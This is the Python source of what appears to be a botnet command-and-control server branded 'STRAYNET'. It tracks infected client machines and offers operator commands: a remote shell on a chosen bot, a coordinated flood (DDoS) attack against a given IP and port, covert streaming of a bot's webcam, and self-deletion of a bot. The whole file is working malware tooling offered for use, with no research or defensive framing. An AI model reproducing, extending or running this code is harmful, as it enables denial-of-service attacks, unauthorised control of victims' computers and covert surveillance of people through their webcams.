import asyncio
from asyncio import events
from typing import Any, Coroutine
import aioconsole
import os
import sys
import cv2
import numpy as np
from rich.console import Console

class Client():
    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None, reader:asyncio.StreamReader=None):
        self.id = id
        self.ip = ip
        self.writer = writer
        self.reader = reader

HOST = "0.0.0.0"
PORT = 80

is_flooding = False
is_streaming_cam = False

clients: list[Client] = []

console = Console(highlight=False)
server:asyncio.Server = None

server_commands_task:asyncio.Task = None
shell_task:asyncio.Task = None

prompt_prefix = "server:~$ "
shell_prompt_prefix = "> "
title = r"""
███████╗████████╗██████╗  █████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
███████╗   ██║   ██████╔╝███████║ ╚████╔╝ ██╔██╗ ██║█████╗     ██║   
╚════██║   ██║   ██╔══██╗██╔══██║  ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
███████║   ██║   ██║  ██║██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
                      [cyan]Created by User ;) ~ v1[/cyan]     
"""

#? Remove everything displayed in the terminal
def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

#? Get the client from an ID
def get_client_from_id(input_id:int):
    try:
        for c in clients:
            if int(c.id) == int(input_id):
                return c
    except:
        console.print("[red](-)Client wasn't found[/red]")
        
#? Get the arguments in a command
def get_arg(tokens:list, arg_token:str):
    return str(tokens[tokens.index(arg_token) + 1])

#? Controls the async input
async def async_input(prompt):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)

#? The main part of the program, from here the user will control everything (commands, bots, etc)
def main_gui():
    clear_screen()
    console.print(f"[bright_red]{title}[/bright_red]")
    console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
    console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")

#? Handles the server commands
async def server_commands():
    while True:
        command = await async_input(f"\n{prompt_prefix}")
        await parse_command(command)
        await asyncio.sleep(0.01)
        
#? Run a shell
async def shell(tokens):
    global server_commands_task
    
    client = get_client_from_id(get_arg(tokens, "-id"))
    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with 'q'[/cyan]")
    
    while True:
        command = await async_input(f"\n{shell_prompt_prefix}")
            
        if command == "q":
            server_commands_task = asyncio.create_task(server_commands())
            await server_commands_task
            return
        
        client.writer.write(f"shell {command}".encode())
        
        header_data = await client.reader.readuntil(b"\n")
        header_parts = header_data.split(b":")
                
        #? if the marker is NOT found in the header parts, go back to the beginning of the while loop
        if b'shell-marker' not in header_parts:
            return
                
        response_length = int(header_parts[header_parts.index(b"byte-length") + 1])
        response_data = await client.reader.readexactly(response_length)
        response_data = response_data.decode().splitlines()
        response_data = "\n".join(response_data)
        
        console.print(f"[cyan]{response_data}[/cyan]")
        
#? Parse commands to client
async def parse_command(command:str):
    global shell_task
    
    try:
        tokens = command.split()
        if not tokens:
            console.print("[red](-) No command was input[/red]")
        
        command = tokens[0]
        if command == "help":
            console.print("[INSERT HELP]")
        elif command == "clear":
            main_gui()
        elif command == "ls":
            await list_clients()
        elif command == "info":
            await get_info(tokens)
        elif command == "rm":
            await do_remove(tokens)
        elif command == "flood":
            await flood(tokens)
        elif command == "stop_flood":
            await stop_flood()
        elif command == "shell":
            server_commands_task.cancel()
            shell_task = asyncio.create_task(shell(tokens))
        elif command == "stream_cam":
            asyncio.create_task(stream_cam(tokens))
        elif command == "quit":
            sys.exit()
        else:
            console.print("[red](-) Command not found[/red]")
    except:
        pass
        
#? Remove everything, then print out the menu
def clear_screen_to_menu():
        clear_screen()
        console.print(f"[bright_red]{title}[/bright_red]")
        console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
        console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")

#? Prints out a list of all connected clients
async def list_clients():
    console.print(f"[cyan]Bots: {len(clients)}")
    for c in clients:
        console.print(f"[cyan]ID: {c.id}    IP: {c.ip}[/cyan]")

#? Prints info on the client, such as ip, os, etc
async def get_info(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        console.print(f"[cyan]Client ID: {client.id}[/cyan]")
        console.print(f"[cyan]IP: {client.ip}[/cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'interact -id (USER_ID)'[/red]")

#? Remove the client from the server
async def do_remove(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        client.writer.write("delete_self".encode())
        await client.writer.drain()
        client.writer.close()
        console.print("[cyan](*) Removed user[cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'remove -id (USER_ID)'[/red]")

#? Start a flood attack (DDOS)
async def flood(tokens:list):
    global is_flooding
    try:
        if is_flooding:
            console.print("[cyan](*) A flooding attack is already happening, stop it with 'stop_flood'[/cyan]")
            return
        
        tokens = " ".join(tokens)
        for c in clients:
            c.writer.write(str(tokens).encode())
            await c.writer.drain()
            
        console.print("[cyan](*) Flooding attack started[/cyan]")
        is_flooding = True
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'flood -ip (IP ADDRESS) -port (PORT)'[/red]")

#? Stops the flood attack (DDOS)
async def stop_flood():
    global is_flooding
    try:
        if not is_flooding:
            console.print("[cyan](*) There is no flooding attack currently ongoing[/cyan]")
            return
        
        for c in clients:
            c.writer.write("stop_flood".encode())
            await c.writer.drain()
        
        console.print("[cyan](*) Flooding attack stopped[/cyan]")
        is_flooding = False
    except Exception as e:
        console.print(f"[red](-) Error: {e}[/red]")
        
#? Stream webcam
async def stream_cam(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        client.writer.write("stream_cam".encode())
        cv2.namedWindow(f"Bot ID: {client.id}")
        console.print("[cyan](*) Getting bot cam...[/cyan]")
        while True:
            header_data = await client.reader.readuntil(b"\n")
            header_parts = header_data.split(b":")
            header_parts = [part.strip() for part in header_parts]
            
            #? if the marker is NOT found in the header parts, go back to the beginning of the while loop
            if b'stream-cam-marker' not in header_parts:
                continue
            
            frame_length = int(header_parts[header_parts.index(b"byte-length") + 1])
            frame_data = bytearray()
            while len(frame_data) < frame_length:
                chunk = await client.reader.read(frame_length - len(frame_data))
                frame_data.extend(chunk)

            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            cv2.imshow(f"Bot ID: {client.id}", frame)
            
            await asyncio.sleep(0)
            
            key = cv2.waitKey(1) & 0xFF
            
            if key == ord("q") or key == 27:
                break
            
        cv2.destroyWindow(f"Bot ID: {client.id}")
    except Exception as e:
        print(e)
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'stream_cam -id (ID)'[/red]")

#? Gets called whenever a client connects
async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):   
    try:
        id = len(clients) + 1
        ip = writer.get_extra_info("peername")
        client = Client(id, ip, writer, reader)
        clients.append(client)
        await writer.wait_closed()
    except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        pass
    finally:
        clients.remove(client)
        writer.close()
        
#? Start server + keep it going forever
async def start_server():
    global server
    global server_commands_task
    
    server = await asyncio.start_server(handle_client, HOST, PORT)
    main_gui()
    server_commands_task = asyncio.create_task(server_commands())
    await asyncio.create_task(server.serve_forever())
    
async def start_screen():
    try:
        clear_screen()
        console.print(f"[bright_red]{title}[/bright_red]\n")
        console.print("[bright_red]COMMANDS:\n- [cyan]'start'[/cyan] starts server\n- [cyan]'exit'[/cyan] exits the program[/bright_red]")
        while True:
            user_input:str = input(f"\n{prompt_prefix}").lower()
            
            if user_input == "start":
                await start_server()
            elif user_input == "exit":
                sys.exit()
            else:
                console.print("[red](-) Command not found[/red]")
    except:
        pass
    
if __name__ == "__main__":
    try:
        asyncio.run(start_screen())
    except:
        pass